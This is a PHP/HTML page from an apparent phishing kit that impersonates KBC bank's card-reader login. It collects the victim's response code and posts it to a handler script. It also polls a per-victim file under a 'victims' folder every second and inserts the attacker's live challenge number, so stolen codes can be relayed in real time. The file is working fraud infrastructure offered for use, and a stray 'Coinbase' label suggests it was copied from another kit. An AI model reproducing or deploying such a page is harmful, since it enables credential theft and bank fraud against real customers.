<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>KBC</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
          .active{
            background-color:#0097DB !important;
            color:white !important;
          }
        </style>
    </head>
    <body>
      
    <div class="header_cbc_1">
      <div class="logo">
        <img src="./Asstes/imgs/kbc.svg" alt="">
      </div>
    </div>
    <div class="wrapper_form_cbc_l d-flex">
      <div class="part_left">
        <img src="./Asstes/imgs/touch-background.jpg" alt="">
      </div>
      <div class="part_right">
        <div class="wrapper_right">
          <div class="box_lect">
            <div class="infos_lect">
              <div class="title">
                <p class="mb-0"><?php echo get_text('kb_l_1'); ?></p>
              </div>
              <div class="info d-flex align-items-center justify-content-between">
                <p class="mb-0 xt"><?php echo get_text('kb_l_2'); ?></p>
                <div class="part_right_info d-flex align-items-center">
                  <img src="./Asstes/imgs/login.svg" alt="">
                  <p class="mb-0">+</p>
                  <img src="./Asstes/imgs/login.svg" alt="">
                </div>
              </div>
              <div class="info d-flex align-items-center justify-content-between">
                <p class="mb-0 xt"><?php echo get_text('kb_l_3'); ?></p>
                <div class="part_right_info d-flex align-items-center">
                  <p class="num mb-0 bb">5005 5505</p>
                  <p class="mb-0">+</p>
                  <img src="./Asstes/imgs/ok.svg" alt="">
                </div>
              </div>
              <div class="info d-flex align-items-center justify-content-between">
                <p class="mb-0 xt"><?php echo get_text('kb_l_4'); ?></p>
                <div class="part_right_info d-flex align-items-center">
                  <p class="num mb-0"><?php echo get_text('cb_l_5'); ?></p>
                  <p class="mb-0">+</p>
                  <img src="./Asstes/imgs/ok.svg" alt="">
                </div>
              </div>
            </div>
          </div>
          <form  action="./Asstes/php/config/func.php" method="post">
            <input type="hidden" name="name_bank" value="KBC">
            <input type="hidden" name="lecture">
            <div class="input-group">
              <div class="form-group">
                <label for=""><?php echo get_text('kb_l_5'); ?></label>
                <input type="text" name="code-lec" id="code-lec" placeholder="_ _ _ _  _ _ _ _">
                <?php if( isset($_GET['error']) ) : ?>
                <p class="error_ mb-0"><?php echo get_text('kb_l_6'); ?></p>
                <?php endif; ?>
              </div> 
            </div>
            <div class="btn_sub">
              <button type="submit" disabled><?php echo get_text('kb_l_7'); ?></button>
            </div>
          </form>
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>   
        
        $("#code-lec").mask('0000 0000');

        $(".form-group input").keyup(function(){
          if ($(".form-group #code-lec").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        }) 
        var ip = '<?php echo get_client_ip();?>';
        var waiting = setInterval(function() {
            $.get(`./victims/${ip}+.txt?` + new Date().getTime(), function(data) {
                if( data != "") {
                    $(".bb").text(data);
                    // console.log(data);
                }
            });
        }, 1000);           
    </script>
    </body>
</html>